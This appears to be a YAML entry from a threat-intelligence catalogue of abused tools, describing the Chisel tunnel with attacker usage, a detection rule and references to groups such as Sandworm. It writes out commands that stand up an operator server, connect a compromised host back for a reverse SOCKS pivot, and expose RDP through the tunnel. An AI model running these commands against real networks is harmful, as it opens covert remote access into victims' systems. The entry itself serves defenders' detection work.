---
Name: Chisel
Description: Chisel is a self-hosted, fast TCP/UDP tunnel transported over HTTP and secured via SSH, bundled in a single executable that acts as both client and server. Because the server is operator-run, there is no vendor domain to block. It is heavily abused for pivoting, SOCKS proxying and port forwarding, observed with Sandworm/APT44, Seedworm, PYSA (ChaChi) and Mespinoza, among many others.
Author: cyberbuff
Created: 2026-09-17
Commands:
    - Command: chisel server -p 8080 --reverse
      Description: Starts the operator-controlled Chisel server, listening for clients and permitting reverse port forwards initiated from compromised hosts.
      Usecase: Standing up the tunnel endpoint that compromised hosts connect back to.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS

    - Command: chisel client <SERVER>:8080 R:socks
      Description: Connects a compromised host back to the Chisel server and opens a reverse SOCKS proxy, giving the operator SOCKS access into the victim network.
      Usecase: Establishing a SOCKS pivot into an internal network.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS

    - Command: chisel client <SERVER>:8080 R:3389:127.0.0.1:3389
      Description: Reverse-forwards a public port on the Chisel server to a local service such as RDP on the compromised host, exposing it to the operator.
      Usecase: Reaching an internal service such as RDP through the tunnel.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS
Custom_Domain_Supported: True
Full_Path:
    - Path: Downloaded/Installed chisel binary (single executable acting as client and server), executed anywhere on the system.
Detection:
    - Command: "Execution of the chisel binary with client/server subcommands, especially the R: reverse forward and socks arguments."
Resources:
    - Link: https://github.com/jpillora/chisel
    - Link: https://services.google.com/fh/files/misc/apt44-unearthing-sandworm.pdf
---
